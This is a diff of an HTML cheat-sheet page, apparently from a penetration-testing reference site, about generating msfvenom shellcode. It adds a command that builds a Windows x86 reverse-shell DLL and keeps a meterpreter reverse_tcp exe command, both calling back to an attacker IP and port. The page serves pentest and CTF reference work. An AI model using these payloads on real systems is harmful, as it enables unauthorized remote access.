@@ -150,6 +150,7 @@
   <li><a href="https://tldrbins.github.io/@reverse-shell/">Reverse Shell</a></li>
   <li><a href="https://tldrbins.github.io/@msfconsole/">Msfconsole</a></li>
   <li><a href="https://tldrbins.github.io/@msfvenom/">Msfvenom</a></li>
+  <li><a href="https://tldrbins.github.io/@revshell/">Revshell</a></li>
 </ul>
 <hr>
 <div class="content">
@@ -173,7 +174,7 @@
 </div>
   <h3 id="generate-shellcode">Generate Shellcode</h3>
 <p><small><em>Note: stageless payload can catch with nc directly</em></small></p>
-<h4 id="windows-x64">Windows x64</h4>
+<h4 id="windows-x64-64-bit">Windows x64 (64-bit)</h4>
 <p class="tabs">
 <button data-tabset="set1" data-tabcontent="tab1" class="active">Staged exe</button>
 
@@ -210,11 +211,13 @@ TO-DO</div></pre></div></div></div>
 
 
 <p></p>
-<h4 id="windows-x86">Windows x86</h4>
+<h4 id="windows-x86-32-bit">Windows x86 (32-bit)</h4>
 <p class="tabs">
 <button data-tabset="set2" data-tabcontent="tab1" class="active">Staged exe</button>
 
 <button data-tabset="set2" data-tabcontent="tab2">Stageless exe</button>
+
+<button data-tabset="set2" data-tabcontent="tab3">Stageless dll</button>
 
 </p><div class="tabset-wrapper" data-tabset-group="set2"><div class="tabcontent active" data-tabset="set2" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows LHOST=<span class="o editable-keyword">&lt;LOCAL_IP&gt;</span> LPORT=<span class="o editable-keyword">&lt;LOCAL_PORT&gt;</span> &gt; rev.exe
 </span></span></span></code><div class="output-bubble">Sample Output:
@@ -228,7 +231,11 @@ TO-DO</div></pre></div></div></div>
 </span></span><span class="line"><span class="cl"><span class="go">No encoder specified, outputting raw payload
 </span></span></span><span class="line"><span class="cl"><span class="go">Payload size: 324 bytes
 </span></span></span><span class="line"><span class="cl"><span class="go">Final size of exe file: 73802 bytes
-</span></span></span></div></pre></div></div></div>
+</span></span></span></div></pre></div></div><div class="tabcontent" data-tabset="set2" data-tabcontent="tab3"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msfvenom -p windows/shell_reverse_tcp -a x86 -f dll --platform windows LHOST=<span class="o editable-keyword">&lt;LOCAL_IP&gt;</span> LPORT=<span class="o editable-keyword">&lt;LOCAL_PORT&gt;</span> EXITFUNC=thread &gt; rev.dll
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div></div></div>
+
+
 
 <p></p>
 <p><small><em>Note: These will be flagged by AV</em></small>
